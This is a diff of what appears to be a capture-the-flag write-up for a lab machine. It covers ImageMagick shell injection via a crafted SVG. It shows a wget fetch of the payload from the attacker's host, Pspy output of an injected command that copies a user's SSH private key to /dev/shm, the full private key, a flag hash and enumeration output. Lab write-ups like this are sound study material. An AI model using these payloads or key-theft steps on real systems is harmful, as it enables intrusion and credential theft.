@@ -220,6 +220,8 @@ cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format 
 pkill mogrify
 ````
 
+## Exploit
+
 * There is an exploit process for [ImagemMagick](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)
 
 This exploit was retrived from RaidForums, no other that I tried to write worked well.
@@ -241,7 +243,7 @@ This exploit was retrived from RaidForums, no other that I tried to write worked
 $ wget http://10.10.14.221:8000/poc.svg -O /var/www/dev01.artcorp.htb/convert_images/poc.svg 
 ````
 
-* Pspy output
+3. Await for cron call the script, Pspy output
 ````bash
 2022/01/29 17:50:40 CMD: UID=33   PID=22965  | cp -v poc.svg /var/www/dev01.artcorp.htb/convert_images/ 
 2022/01/29 17:51:01 CMD: UID=1000 PID=22979  | /bin/sh -c /usr/local/bin/convert_images.sh 
@@ -262,7 +264,7 @@ $ wget http://10.10.14.221:8000/poc.svg -O /var/www/dev01.artcorp.htb/convert_im
 2022/01/29 17:52:01 CMD: UID=1000 PID=23007  | sh -c 'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/key`;""  '-sOutputFile=/tmp/magick-R5ofha96RI9cw4VsZzCJO0q7tiunPnTR%d' '-f/tmp/magick-mC20wCmD2SNtM7CDW0mwwHsjZ9R2av4i' '-f/tmp/magick-iOezqKSMOQbuW0QxqtKsb-XPuEyBfDfK'   
 ````
 
-* Thomas sshkey
+* Thomas sshkey in /dev/shm/key
 ````ssh
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -304,10 +306,19 @@ bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
 -----END OPENSSH PRIVATE KEY-----
 ````
 
+* SSH logging
 ````
 bash-5.0$ cat user.txt
 ed0090c7bc96ec6aec981f300e8bfb8e
 ````
+
+## Enumeration
+
+* Pspy output
+````
+2022/01/29 18:08:01 CMD: UID=0    PID=23283  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
+````
+
 
 
 # Secrets
